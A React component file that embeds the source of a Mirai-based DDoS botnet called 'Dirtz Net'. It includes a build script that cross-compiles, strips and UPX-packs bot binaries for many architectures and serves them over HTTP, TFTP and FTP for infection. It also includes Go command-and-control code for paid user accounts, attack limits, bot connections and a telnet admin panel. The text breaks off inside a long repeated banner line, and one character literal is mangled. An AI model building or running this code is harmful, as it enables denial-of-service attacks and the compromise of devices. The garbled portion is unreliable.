import React, { useState, useEffect } from 'react';

interface CodeFile {
  name: string;
  language: string;
  content: string;
}

interface ToolDirtzNetComponentProps {
  toolPath: string;
}

const fileContents: { [key: string]: string } = {
  '/home/ubuntu/extracted_tools/Dirtz Net/setup.sh': `#!/bin/bash
echo "[CC] INSTALLING DEPENDENCIES"
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

echo "[CC] DOWNLOADING CROSS COMPILERS"
mkdir /etc/xcompile/
cd /etc/xcompile/
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2

echo "[CC] EXTRACTING CROSS COMPILERS"
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
rm -rf *.tar.bz2

echo "[CC] MOVING CROSS COMPILERS"
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l

echo "[CC] SETTING UP GOLANG"
cd /tmp
wget https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz -q
tar -xzf go1.8.3.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
go version
go env
cd /root
chmod 777 * -R

echo "[CC] EXPORTING BINARIES"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

echo "[CC] EDITING HTTP/TFTP DIRECTORIES"
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go

echo "[CC] COMPILING BINARIES"
compile_bot i586 sora.x86 "-static"
compile_bot mips sora.mips "-static"
compile_bot mipsel sora.mpsl "-static"
compile_bot armv4l sora.arm "-static"
compile_bot armv5l sora.arm5 ""
compile_bot armv6l sora.arm6 "-static"
compile_bot armv7l sora.arm7 "-static"
compile_bot powerpc sora.ppc "-static"
compile_bot sparc sora.spc "-static"
compile_bot m68k sora.m68k "-static"
compile_bot sh4 sora.sh4 "-static"

echo "[CC] COPYING BINARIES TO /BINS/"
cp release/sora.* /var/www/html/bins
cp release/sora.* /var/ftp
mv release/sora.* /var/lib/tftpboot
rm -rf release

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/bins/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*

echo "[CC] ALL BUILD PROCESSES COMPLETE"
python netcore.py
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/database.go': `package main

import (
    "database/sql"
    "fmt"
    "net"
    "encoding/binary"
	"time"
    _ "github.com/go-sql-driver/mysql"
    "errors"
)

type Database struct {
    db      *sql.DB
}

type AccountInfo struct {
    username    string
    maxBots     int
    admin       int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println("\033[1;36m[ \033[1;31mDIRTZ BOTNET STARTED\033[1;36m ]")
    return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    return true, accInfo
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
    rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
    if err != nil {
        fmt.Println(err)
        return false
    }
    defer rows.Close()
    for rows.Next() {
        var prefix string
        var netmask uint8
        rows.Scan(&prefix, &netmask)

        // Parse prefix
        ip := net.ParseIP(prefix)
        ip = ip[12:]
        iWhitelistPrefix := binary.BigEndian.Uint32(ip)

        for aPNetworkOrder, aN := range attack.Targets {
            rvBuf := make([]byte, 4)
            binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
            iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
            if aN > netmask { // Whitelist is less specific than attack target
                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                    return true
                }
            } else if aN < netmask { // Attack target is less specific than whitelist
                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                    return true
                }
            } else { // Both target and whitelist have same prefix
                if (iWhitelistPrefix == iAttackPrefix) {
                    return true
                }
            }
        }
    }
    return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
    rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
    defer rows.Close()
    if err != nil {
        fmt.Println(err)
    }
    var userId, durationLimit, admin, cooldown uint32
    if !rows.Next() {
        return false, errors.New("Your access has been terminated")
    }
    rows.Scan(&userId, &durationLimit, &admin, &cooldown)

    if durationLimit != 0 && duration > durationLimit {
        return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
    }
    rows.Close()

    if admin == 0 {
        rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
        if err != nil {
            fmt.Println(err)
        }
        if rows.Next() {
            var timeSent, historyDuration uint32
            rows.Scan(&timeSent, &historyDuration)
            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
        }
    }

    this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
    return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
    rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{"", 0, 0}
    }
    defer rows.Close()
    if !rows.Next() {
        return false, AccountInfo{"", 0, 0}
    }
    var accInfo AccountInfo
    rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
    return true, accInfo
}

func (this *Database) RemoveUser(username string) (bool) {
    rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
    return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
    if err != nil {
        fmt.Println(err)
        return false
    }
    if rows.Next() {
        return false
    }
    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
    return true
}
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/bot.go': `package main

import (
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
`,
  '/home/ubuntu/extracted_tools/Dirtz Net/cnc/admin.go': `package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mUsername\x1b[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;196mPassword\x1b[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{\'-\\, \'\\\', \'|\', \'/'\}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;37mAuthing you into the \x1b[38;5;196mDirty Side ;) \x1b[0;37m... \x1b[38;5;196m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))	


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;37mIncorrect credentials\r\n"))
        this.conn.Write([]byte("\r\x1b[0;37mPress any key to exit\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
	
	this.conn.Write([]byte("\r\n"))	
	this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
	this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\r\x1b[38;5;196m    	 +---+        ▓█████▄  ██▓ ██▀███  ▄▄▄█████▓▒███████▒        +---+\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m         |---|        ▒██▀ ██▌▓██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒ ▒ ▒ ▄▀░        |---|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m         |---|        ░██   █▌▒██▒▓██ ░▄█ ▒▒ ▓██░ ▒░░ ▒ ▄▀▒░         |---|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m     .---^ - ^---.    ░▓█▄   ▌░██░▒██▀▀█▄  ░ ▓██▓ ░   ▄▀▒   ░    .---^ - ^---.\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m     :___________:    ░▒████▓ ░██░░██▓ ▒██▒  ▒██▒ ░ ▒███████▒    :___________:\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░  ▒ ░░   ░▒▒ ▓░▒░▒       |  |//|\r\n")) 
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░    ░    ░░▒ ▒ ░ ▒       |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|        ░ ░  ░  ▒ ░  ░░   ░   ░      ░ ░ ░ ░ ░       |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|           ░     ░     ░                ░ ░          |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|          ░    WELCOME TO DIRTZ BOTNET    ░          |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |//|      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄      |  |//|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |  |.-|      ▄ Owners/Creators k2ys & jeweater       ▄      |  |.-|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m        |.-\'**|      ▄ Type HELP For Commands & Tools --_--  ▄      |.-\'**|\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m         *****       ▄ OVH Bypass Equiped Here               ▄       *****\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m          ***        ▄ Enjoy Your Time Here :)               ▄        ***\r\n"))
    this.conn.Write([]byte("\r\x1b[38;5;196m           *         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄         *\r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))
	
    go func() {
        i := 0
        for {
			    var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
				
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Dirtz BotCount | Username: [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[38;5;196m" + username + "\x1b[0;37m@\x1b[38;5;196mDirtz\x1b[0;37m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
			if err != nil || cmd == "cls" || cmd == "clear" {
			    this.conn.Write([]byte("\r\n"))
			    this.conn.Write([]byte("\r\n\033[0m"))		 
				this.conn.Write([]byte("\r\x1b[38;5;196m            ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴅɪʀᴛᴢ ʙᴏᴛɴᴇᴛ ᴇɴᴊᴏʏ ʏᴏᴜʀ ᴛɪᴍᴇ ʜᴇʀᴇ\r\n"))
				this.conn.Write([]byte("\r\x1b[38;5;196m  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄